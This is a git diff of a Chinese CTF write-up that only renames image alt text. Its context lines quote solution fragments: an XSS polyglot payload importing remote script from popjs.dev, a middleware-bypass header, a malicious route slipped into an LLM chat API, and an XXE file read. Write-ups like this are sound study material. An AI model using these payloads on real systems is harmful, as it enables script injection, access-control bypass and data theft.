@@ -13,7 +13,7 @@ tags: []
 
 被打成20分的Java反序列化？！，让我来看看这个是什么东西，在`java/com/serialies/serialies/PersonController.java`中
 
-![1](./assets/001.jpg)
+![image](./assets/001.jpg)
 
 如果是POST就调用`person.getJob().init();`，如果是GET直接返回全部对象，
 
@@ -172,11 +172,11 @@ console.log("完整 Flag:", flag);
 
 但是一点用没有，书鱼哥哥起床之后直接秒了，F12查看到js(我没找到，太粗心了)
 
-![1](./assets/002.jpg)
+![image](./assets/002.jpg)
 
 F12原来和直接查看源码的结果不一样，改一下js，始终改不了，说是源文件不让改，结果我新建一个`test.js`，又可以了
 
-![1](./assets/003.jpg)
+![image](./assets/003.jpg)
 
 ```js
   async function checkCode(){
@@ -206,7 +206,7 @@ x-middleware-subrequest: middleware
 
 ```
 
-![1](./assets/004.jpg)
+![image](./assets/004.jpg)
 
 ## Rock my Password
 
@@ -270,7 +270,7 @@ with Pool(8) as pool:
 jaVasCript:/*-/*`/*\`/*'/*"/*%0A%0a*/(/* */oNcliCk="import('//popjs.dev/lokUQ')" )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciframe/<iframe/oNloAd="import('//popjs.dev/lokUQ')"//>\x3e
 ```
 
-![1](./assets/005.jpg)
+![image](./assets/005.jpg)
 
 把poc全部放进去就有了，好抽象的题目，这怕不是给平台打广告的
 
@@ -389,13 +389,13 @@ Content-Length: 12
 {"test":"å"}
 ```
 
-![1](./assets/006.jpg)
+![image](./assets/006.jpg)
 
 ## MaybeHappyEndingGPT
 
 看到路由`app/api/chat/route.ts`，
 
-![1](./assets/007.jpg)
+![image](./assets/007.jpg)
 
 可以在里面穿插恶意路由，sun师傅LLM出来的数据包
 
@@ -418,7 +418,7 @@ Priority: u=0
 
 没拿到flag的多发几次包，有点让AI宕机反应不过来那种
 
-![1](./assets/008.jpg)
+![image](./assets/008.jpg)
 
 ## Editor
 
@@ -484,11 +484,11 @@ if __name__ == "__main__":
 
 改成admin的成功进去admin的页面，发现一个检查文件是否存在的页面，找了很久发现要改一下前端代码
 
-![1](./assets/009.jpg)
+![image](./assets/009.jpg)
 
 再刷新就发现了这个
 
-![1](./assets/010.jpg)
+![image](./assets/010.jpg)
 
 最后让打一个xxe，读flag.txt就好了
 
